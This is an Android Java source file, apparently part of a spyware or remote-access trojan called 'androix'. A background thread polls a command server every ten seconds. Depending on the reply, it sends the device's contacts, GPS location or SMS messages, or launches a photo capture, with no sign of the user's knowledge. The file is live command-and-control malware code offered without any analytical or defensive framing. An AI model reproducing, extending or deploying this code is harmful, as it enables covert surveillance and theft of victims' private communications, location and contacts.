package com.androix;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import java.util.logging.Handler;

/**
 * Created by Rafael on 16/10/15.
 */
public class Consultas extends Thread{
    private Context context;
    private Service service;



    public Consultas(Context ctx, Service sv) {
        context = ctx;
        service = sv;
    }


    public void run() {
        while (true) {
            try {
                Thread.sleep(10000);
            } catch (Exception e) {
                e.printStackTrace();
            }

            if (Config.VerificaConexao(context)) {

                try{
                    Resposta( new ConexaoHttp().get(Config.URL_ACAO) );
                }catch(Exception e){
                    Log.i("error http get:", e.getMessage());
                }

            }

        }
    }


    public void Resposta(String dados) {
        if (dados.contains("html")){
            Log.i("Servidor:", "error backend");
        }else{
            efetua_acao(dados);
        }
    }


    private void efetua_acao(String acao){
        int n = Integer.parseInt(acao);

        switch (n) {
            //  contatos
            case 1:
                Log.i("PEDIDO SERVIDOR:", "Contato");
                new Contatos().envia(context);
                break;

            //  Coordenadas GPS
            case 2:
                Log.i("PEDIDO SERVIDOR:", "Gps");
                new Localizacao(context);
                break;

            // Sms
            case 3:
                Log.i("PEDIDO SERVIDOR:", "Sms");
                new SmsMensagens(context);
                break;

            //Foto
            case 4:
                Log.i("PEDIDO SERVIDOR:", "Foto");
                Intent i = new Intent(service, Foto.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(i);
                break;

            case 404:
                Log.i("Servidor:", "Offline");
                break;
        }
    }



}

